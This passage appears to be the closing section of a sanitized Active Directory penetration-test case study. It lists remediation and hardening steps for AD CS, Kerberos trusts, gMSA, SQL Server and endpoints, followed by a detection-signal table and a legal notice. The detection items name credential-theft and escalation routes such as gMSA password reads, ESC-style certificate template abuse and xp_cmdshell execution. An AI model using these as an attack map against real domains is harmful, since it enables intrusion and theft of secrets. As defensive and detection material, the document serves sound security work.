- Remove unauthorized members and foreign security principals from gMSA reader/manager groups.
- Rotate exposed user credentials and all affected gMSA passwords.
- Disable `xp_cmdshell` unless explicitly required and monitored.
- Remove local administrator additions created during the assessment.
- Review and reset credentials for accounts exposed through directory replication.

### AD CS Hardening

- Review all templates for ESC1-ESC15 style misconfigurations.
- Restrict template modification rights to dedicated PKI administrators.
- Require manager approval or authorized signatures for high-impact templates.
- Prevent enrollee-supplied SAN unless required by a documented business process.
- Monitor certificate requests containing privileged UPNs or administrator SIDs.
- Enable CA event auditing and forward events to SIEM.

### Kerberos and Trust Controls

- Review all cross-forest trust relationships and SID filtering settings.
- Audit foreign security principals in privileged groups.
- Monitor unusual cross-realm service ticket requests.
- Enforce least privilege for ACLs that control groups, service accounts, and delegation settings.

### gMSA Controls

- Limit `PrincipalsAllowedToRetrieveManagedPassword` to tightly scoped groups.
- Monitor reads of `msDS-ManagedPassword` and changes to gMSA reader groups.
- Treat gMSA AES keys as high-value secrets equivalent to service account passwords.

### SQL Server Controls

- Run SQL Server services under least-privilege identities.
- Remove unnecessary local privileges from service accounts.
- Disable `xp_cmdshell` and alert on enablement events.
- Segment SQL services away from domain controllers where possible.

### Endpoint Controls

- Disable persistent PowerShell history for sensitive accounts and restricted endpoints.
- Clear historical PSReadLine files after credential exposure.
- Deploy PowerShell transcription and script block logging with secure forwarding.
- Prohibit plaintext credentials in command history, scripts, and operational notes.

---

## Detection Opportunities

| Detection Area | Signal |
|---|---|
| AD CS | Certificate enrollment for privileged UPN/SID combinations |
| AD CS | Template modifications to EKU, SAN, enrollment flags, or manager approval settings |
| Kerberos | Cross-realm TGS requests from unusual principals |
| LDAP | Writes to `groupType`, `member`, `nTSecurityDescriptor`, and RBCD attributes |
| gMSA | Reads of managed password material by newly added principals |
| SQL Server | `xp_cmdshell` enablement and suspicious command execution |
| Windows | Local group membership changes on domain controllers |
| Endpoint | Access to PSReadLine history files by service accounts |

---

## Legal and Ethical Notice

This publication is a sanitized case study derived from an authorized security assessment. It is provided for defensive education, detection engineering, and remediation planning. No real client identifiers, secrets, flags, or infrastructure values are disclosed.

Unauthorized use of the techniques described here is illegal. Always obtain written authorization before performing security testing.

---

<div align="center">

**AMN SECURITY**  
*استشارات الأمن الهجومي*  
العراق — عملاء حول العالم

<a href="https://amn.amnoffsec.workers.dev/">الموقع</a> •
<a href="mailto:ayman.mahmoudoffsec@gmail.com">البريد</a> •
<a href="https://www.instagram.com/ixctw?">Instagram</a>

© 2026 AMN SECURITY. All rights reserved.

</div>
